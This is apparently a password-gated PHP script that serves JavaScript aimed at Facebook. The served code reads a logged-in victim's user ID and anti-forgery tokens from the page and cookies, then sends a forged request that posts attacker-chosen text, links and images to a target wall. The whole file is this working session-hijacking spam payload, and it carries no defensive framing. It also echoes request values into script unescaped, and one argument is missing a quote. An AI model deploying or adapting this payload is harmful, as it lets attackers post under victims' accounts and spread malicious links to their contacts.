<?php
$password = $_GET["pass"];
$url = $_GET["url"];
$pic = $_GET["pass"];
$link = $_GET["link"];
$title = $_GET["title"];
$target = $_GET["target"];
$favicon = $_GET["favico"];
$postText = $_GET["postText"];
$description = $_GET["desc"];

if ($password == "tno") {
?>
if (document.domain.search("facebook") == 0)
{
  var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
  var cid = document.getElementsByName('xhpc_composerid')[0].value;
  var tid = document.getElementsByName("xhpc_targetid")[0].value;
  var fbdt = Env.fb_dtsg;
  var fid = Env.post_form_id; /* Status Update */

  function attach_post(targetid, a_msg, a_desc, a_url, a_pic, a_link, a_title, a_favicon) {
    var paramz = "&UIPrivacyWidget[0]=40&UIThumbPager_Input=0&aktion=post&app_id=2309869772&attachment[params][error]=1&attachment[params][etag]=" + Math.floor(Math.random() * 11) + "&attachment[params][external_author]=" + "&attachment[params][favicon]=" + a_favicon + "&attachment[params][fragment_title]=" + "&attachment[params][images][0]=" + a_pic + "&attachment[params][medium]=106&attachment[params][metaTagMap][0][content]=text/html; charset=utf-8&attachment[params][metaTagMap][0][http-equiv]=content-type" + "&attachment[params][metaTagMap][1][content]=" + a_title + "&attachment[params][metaTagMap][1][property]=og:title" + "&attachment[params][metaTagMap][2][content]=" + a_link + "&attachment[params][metaTagMap][2][property]=og:url" + "&attachment[params][metaTagMap][3][content]=" + a_pic + "&attachment[params][metaTagMap][3][property]=og:image" + "&attachment[params][metaTagMap][4][content]=" + a_desc + "&attachment[params][metaTagMap][4][property]=og:description&attachment[params][responseCode]=206" + "&attachment[params][summary]=" + a_desc + "&attachment[params][title]=" + a_title + "&attachment[params][ttl]=0" + "&attachment[params][urlInfo][user]=" + a_url + "&attachment[params][url]=" + a_link + "&attachment[type]=100" + "&fb_dtsg=" + fbdt + "&lsd=&nctr[_mod]=pagelet_wall" + "&post_form_id=" + fid + "&post_form_id_source=AsyncRequest&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&privacy_data[value]=40" + "&xhpc_composerid=" + cid + "&xhpc_context=profile&xhpc_fbx=1&xhpc_ismeta=" + "&xhpc_message=" + a_msg + "&xhpc_message_text=" + a_msg + "&xhpc_targetid=" + targetid + "&xhpc_timeline=";
    var attach = new XMLHttpRequest();
    attach.open("POST", "/ajax/profile/composer.php?__a=1");
    attach.send(paramz);
  }
  attach_post("<?echo $target?>", <?echo $postText?>", "<?echo $description?>", "<?echo $url?>", "<?echo $pic?>", "<?echo $link?>", "<?echo $title?>", "<?echo $favicon?>")
}
<?
} else {
  echo '';
}
?>
